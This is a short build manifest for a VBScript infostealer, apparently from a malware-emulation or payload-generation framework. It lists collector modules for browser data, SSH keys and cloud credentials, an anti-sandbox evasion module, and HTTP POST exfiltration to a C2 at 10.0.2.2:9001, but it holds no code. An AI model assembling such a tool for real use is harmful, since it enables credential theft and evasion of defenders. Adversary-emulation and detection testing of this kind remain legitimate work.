name: vbs_infostealer_paced
description: VBScript infostealer with jitter delays between each collector
format: vbscript

core:
  - core/emit_buffer
  - core/run_cmd
  - core/file_ops

collectors:
  - collectors/sysinfo
  - collectors/processes
  - collectors/network
  - collectors/installed_software
  - collectors/security_products
  - collectors/browser_chromium
  - collectors/ssh_keys
  - collectors/cloud_creds

exfil: exfil/http_post
arch: arch/paced

evasion:
  - evasion/anti_sandbox

vars:
  C2_IP: "10.0.2.2"
  C2_PORT: "9001"
